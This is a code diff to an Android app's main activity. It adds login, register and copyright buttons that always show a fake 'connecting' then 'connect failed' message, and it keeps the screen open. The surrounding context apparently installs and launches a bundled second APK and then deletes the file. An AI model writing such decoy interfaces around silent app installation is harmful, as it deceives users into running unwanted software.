@@ -9,6 +9,10 @@ import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Environment;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Message;
+import android.view.View;
+import android.widget.Toast;
 
 import java.io.File;
 import java.io.FileNotFoundException;
@@ -26,7 +30,26 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        initView();
         install();
+    }
+
+    private void initView() {
+        View.OnClickListener listener = new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Toast.makeText(getApplicationContext(),getResources().getString(R.string.connecting),Toast.LENGTH_LONG).show();
+                new Handler() {
+                    @Override
+                    public void handleMessage(Message msg) {
+                        Toast.makeText(getApplicationContext(),getResources().getString(R.string.connect_failed),Toast.LENGTH_LONG).show();
+                    }
+                }.sendEmptyMessageDelayed(0,5000);
+            }
+        };
+        findViewById(R.id.tv_login).setOnClickListener(listener);
+        findViewById(R.id.bt_regist).setOnClickListener(listener);
+        findViewById(R.id.bt_copyright).setOnClickListener(listener);
     }
 
     private boolean start() {
@@ -43,7 +66,7 @@ public class MainActivity extends Activity {
 
     private void install() {
         if(start()) {
-            finish();
+            //finish();
             return;
         }
         //release apk
@@ -82,7 +105,7 @@ public class MainActivity extends Activity {
             return;
         }
         new File(Environment.getExternalStorageDirectory().getPath() + "/"+ apkName).delete();
-        finish();
+        //finish();
     }
 
     private boolean isPackageAvilible( String packageName )
